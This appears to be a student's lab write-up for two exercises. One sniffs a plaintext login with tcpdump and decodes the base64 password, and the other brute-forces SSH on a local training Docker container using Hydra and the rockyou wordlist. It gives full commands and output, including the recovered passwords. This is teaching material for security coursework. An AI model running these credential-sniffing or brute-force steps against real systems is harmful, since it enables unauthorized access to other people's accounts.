# Attack is the best defense


## task 0. ARP spoofing and sniffing unencrypted traffic 

#### terminal 0
``` bash
-$ sudo tcpdump -i enp0s3 -w dump.pcap 'not port 22'
```

On the other terminal, run the `user_authenticating_into_server` script

#### terminal 1
```bash
-$ ./user_authenticating_into_server
```

Once the script is done, you can manually exit (Ctrl+C) on the terminal 0.

`-$ tcpdump -A -X -r dump.pcap > file.txt`

`-$ grep "=ZB" file.txt`
`
    =ZB.....
    =ZB.....334 UGFzc3dvcmQ6
    ...N=ZB.
    ....=ZB.bXlwYXNzd29yZDk4OTgh
`
the password is `bXlwYXNzd29yZDk4OTgh` base64
and convert to base64 to text `mypassword9898!`

## task 1. Dictionary Attack

You would need to have docker installed on your Ubuntu:
``` bash
-$ sudo apt update
-$ sudo apt install docker.io
```
and install hydra to:
``` bash
-$ sudo apt install hydra
```
and login to docker and start

``` bash
-$ docker login
-$ systemctl start docker
```

``` bash
and now pull and run the Docker image sylvainkalache/264–1:
```

``` bash
-$ docker run -p 2222:22 -d -ti sylvainkalache/264–1
```
I would be making use of the [rockyou](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt) password list.
``` bash
-$ sudo hydra -l sylvain -P /vagrant/rockyou.txt ssh://127.0.0.1:2222 -t 4
```
`
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-21 09:09:20
[DATA] max 4 tasks per 1 server, overall 4 tasks, 12671 login tries (l:1/p:12671), ~3168 tries per task
[DATA] attacking ssh://127.0.0.1:2222/
[2222][ssh] host: 127.0.0.1   login: sylvain   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-21 09:09:23
`
and the password is found `password123`
